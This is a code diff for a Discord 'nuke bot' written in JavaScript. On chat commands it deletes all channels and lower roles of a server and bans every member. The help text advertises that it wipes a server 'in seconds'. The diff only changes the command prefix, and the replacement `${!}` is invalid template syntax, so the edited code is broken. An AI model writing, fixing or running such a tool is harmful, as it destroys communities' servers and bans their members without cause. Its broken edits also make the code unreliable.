@@ -10,24 +10,24 @@ console.log(`${client.user.tag} is online.`);
 
 client.on("message", async(msg)=>{
 
-if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
+if(msg.content.toLowerCase().startsWith("!" + "nuke")){
     msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
     msg.guild.channels.deleteAll();
     msg.guild.members.tap(member => member.ban("your ban message here"));
 }
-if(msg.content.toLowerCase().startsWith(`${prefix}` + "delete")){
+if(msg.content.toLowerCase().startsWith(`${!}` + "delete")){
     msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
     msg.guild.channels.deleteAll();
 }
-if(msg.content.toLowerCase().startsWith(`${prefix}` + "ban")){
+if(msg.content.toLowerCase().startsWith(`${!}` + "ban")){
     msg.guild.members.tap(member => member.ban("<your ban message here>"));
 }
-if(msg.content.toLowerCase().startsWith(`${prefix}` + "help")){
+if(msg.content.toLowerCase().startsWith(`${!}` + "help")){
     msg.author.send({
         embed: {
             color: 0xff0000,
             author: { name: "Nuke Bot Help Commands | .help" },
-            description: `\`${prefix}help\` - To get this help menu in your DMs.\n\`${prefix}delete\` - Deletes all channels and roles of the server in seconds.`
+            description: `\`${!}help\` - To get this help menu in your DMs.\n\`${!}delete\` - Deletes all channels and roles of the server in seconds.`
         }
     })
 }
